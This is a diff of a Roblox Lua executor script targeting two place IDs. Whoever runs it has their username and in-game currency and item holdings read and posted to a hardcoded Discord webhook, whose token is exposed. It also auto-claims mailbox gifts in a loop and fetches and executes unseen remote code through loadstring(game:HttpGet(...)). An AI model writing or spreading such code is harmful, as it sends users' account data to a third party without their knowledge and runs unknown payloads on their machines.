@@ -1,135 +1,136 @@
 
-local function Dialogggg()
-    while true do
-        local player = game.Players.LocalPlayer
-        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
+if game.PlaceId == 15502339080 or game.PlaceId == 8737899170 then
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
+    local Client = require(ReplicatedStorage:WaitForChild("Library"))
+    local Players = game:GetService("Players")
+    local UserInputService = game:GetService("UserInputService")
 
-        if gui then
-            local mailboxMachine = gui.MailboxMachine
-            if mailboxMachine then
-                local giftsFrame = mailboxMachine.Frame.GiftsFrame
-                if giftsFrame then
-                    local itemsFrame = giftsFrame.ItemsFrame
-                    if itemsFrame then
-                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
-                        if frameChild then
-                            local args = {
-                                [1] = {
-                                    [1] = frameChild.Name
-                                }
-                            }
-                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
-                        end
-                    end
-                end
+    local webhookURL = "https://discord.com/api/webhooks/1240051310783627374/FeWsgqN_nlUvPEXVnxgP4pZ5qIJeDn6Uyhd0_vjjBVVGegKU8jGLgVdV0ULgRWumSvML"
+    local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+    local DiamondsTable = {"Diamonds"}
+    local ItemTable = {"Seed Bag", "Insta Plant Capsule"}
+
+    function MakeDiamondsTable(Table)
+        local Temp = {}
+        for i, v in next, Client.Items.All.Globals.All() do
+            if table.find(Table, v._data.id) then
+                table.insert(Temp, v)
             end
         end
-
-        wait(1)
+        return Temp
     end
-end
 
-coroutine.wrap(Dialogggg)()
+    function MakeTable(Table)
+        local Temp = {}
+        for i, v in next, Client.Items.All.Globals.All() do
+            if table.find(Table, v._data.id) then
+                table.insert(Temp, v)
+            end
+        end
+        return Temp
+    end
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local Client = require(ReplicatedStorage:WaitForChild("Library"))
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
+    local diamondsAmount, seedBagAmount, instaPlantCapsuleAmount
+    local seedbagid, instaplantid
 
-local webhookURL = "https://discord.com/api/webhooks/1240051310783627374/FeWsgqN_nlUvPEXVnxgP4pZ5qIJeDn6Uyhd0_vjjBVVGegKU8jGLgVdV0ULgRWumSvML"
-local request = (syn and syn.request) or request or (http and http.request) or http_request
-
-local DiamondsTable = {"Diamonds"}
-local ItemTable = {"Seed Bag", "Insta Plant Capsule"}
-
-function MakeDiamondsTable(Table)
-    local Temp = {}
-    for i, v in next, Client.Items.All.Globals.All() do
-        if table.find(Table, v._data.id) then
-            table.insert(Temp, v)
+    function GrabDiamondsId()
+        for i, MadeTable in ipairs(MakeDiamondsTable(DiamondsTable)) do
+            local Table = HttpService:JSONDecode(tostring(MadeTable))
+            if Table.class == "Currency" then
+                diamondsAmount = Table.data._am
+            end
         end
     end
-    return Temp
-end
 
-function MakeTable(Table)
-    local Temp = {}
-    for i, v in next, Client.Items.All.Globals.All() do
-        if table.find(Table, v._data.id) then
-            table.insert(Temp, v)
+    function GrabId()
+        for i, MadeTable in ipairs(MakeTable(ItemTable)) do
+            local Table = HttpService:JSONDecode(tostring(MadeTable))
+            if Table.data.id == "Seed Bag" then
+                seedBagAmount = Table.data._am
+                seedbagid = Table.uid
+            elseif Table.data.id == "Insta Plant Capsule" then
+                instaPlantCapsuleAmount = Table.data._am
+                instaplantid = Table.uid
+            end
         end
     end
-    return Temp
-end
 
-local diamondsAmount, seedBagAmount, instaPlantCapsuleAmount
-local seedbagid, instaplantid
+    GrabDiamondsId()
+    GrabId()
 
-function GrabDiamondsId()
-    for i, MadeTable in ipairs(MakeDiamondsTable(DiamondsTable)) do
-        local Table = HttpService:JSONDecode(tostring(MadeTable))
-        if Table.class == "Currency" then
-            diamondsAmount = Table.data._am
-        end
-    end
-end
+    local playerName = Players.LocalPlayer.Name
 
-function GrabId()
-    for i, MadeTable in ipairs(MakeTable(ItemTable)) do
-        local Table = HttpService:JSONDecode(tostring(MadeTable))
-        if Table.data.id == "Seed Bag" then
-            seedBagAmount = Table.data._am
-            seedbagid = Table.uid
-        elseif Table.data.id == "Insta Plant Capsule" then
-            instaPlantCapsuleAmount = Table.data._am
-            instaplantid = Table.uid
-        end
-    end
-end
-
-GrabDiamondsId()
-GrabId()
-
-local playerName = Players.LocalPlayer.Name
-
-local contentMsg = {
-    embeds = {
-        {
-            title = "***👨‍💻: " .. playerName .. "***",
-            description = "",
-            color = 16777215,
-            fields = {
-                {
-                    name = "***💎:***",
-                    value = "***" .. (diamondsAmount and diamondsAmount or 0) .. "***"
-                },
-                {
-                    name = "***🫙:***",
-                    value = "***" .. (instaPlantCapsuleAmount and instaPlantCapsuleAmount or 0) .. "***"
-                },
-                {
-                    name = "***🌱:***",
-                    value = "***" .. (seedBagAmount and seedBagAmount or 0) .. "***"
+    local contentMsg = {
+        embeds = {
+            {
+                title = "***👨‍💻: " .. playerName .. "***",
+                description = "",
+                color = 16777215,
+                fields = {
+                    {
+                        name = "***💎:***",
+                        value = "***" .. (diamondsAmount or 0) .. "***"
+                    },
+                    {
+                        name = "***🫙:***",
+                        value = "***" .. (instaPlantCapsuleAmount or 0) .. "***"
+                    },
+                    {
+                        name = "***🌱:***",
+                        value = "***" .. (seedBagAmount or 0) .. "***"
+                    }
                 }
             }
         }
     }
-}
 
-request({
-    Url = webhookURL,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json",
-    },
-    Body = HttpService:JSONEncode(contentMsg),
-})
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = HttpService:JSONEncode(contentMsg),
+    })
 
-if game.PlaceId == 15502339080 or game.PlaceId == 8737899170 then
+    local function Dialogggg()
+        while true do
+            local player = game.Players.LocalPlayer
+            local gui = player.PlayerGui:FindFirstChild("_MACHINES")
+
+            if gui then
+                local mailboxMachine = gui.MailboxMachine
+                if mailboxMachine then
+                    local giftsFrame = mailboxMachine.Frame.GiftsFrame
+                    if giftsFrame then
+                        local itemsFrame = giftsFrame.ItemsFrame
+                        if itemsFrame then
+                            local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
+                            if frameChild then
+                                local args = {
+                                    [1] = {
+                                        [1] = frameChild.Name
+                                    }
+                                }
+                                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
+                            end
+                        end
+                    end
+                end
+            end
+
+            wait(1)
+        end
+    end
+
+    coroutine.wrap(Dialogggg)()
+
     local screenGui = Instance.new("ScreenGui")
     local button = Instance.new("TextButton")
-local WaitValue = 0
+    local WaitValue = 0
+
     screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     button.Parent = screenGui
     button.Size = UDim2.new(0, 200, 0, 50)
@@ -227,33 +228,10 @@ local WaitValue = 0
     }
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1c2273a86dbf2e8469b442e55882aa47.lua"))()
 else
-    local Http = game:GetService("HttpService")
-    local TPS = game:GetService("TeleportService")
-    local Api = "https://games.roblox.com/v1/games/"
+   
+local TPS = game:GetService("TeleportService")
+local placeId = 8737899170
 
-    local _place = 15502339080
-    local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
-
-    -- Updated HTTP request method
-    local httpService = game:GetService("HttpService")
-    local request = (syn and syn.request) or request or (http and http.request) or http_request
-
-    function ListServers(cursor)
-        local Raw = request({
-            Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
-            Method = "GET"
-        })
-        return Http:JSONDecode(Raw.Body)
-    end
-
-    local randomPlayers = math.random(10, 15)  -- Generate a random number between 10 and 15
-    local Server, Next
-
-    repeat
-        local Servers = ListServers(Next)
-        Server = Servers.data[1]
-        Next = Servers.nextPageCursor
-    until Server and Server.playing >= randomPlayers  -- Use randomPlayers variable here
-
-    TPS:TeleportToPlaceInstance(_place,Server.id,Players.LocalPlayer)
+TPS:Teleport(placeId)
 end
+
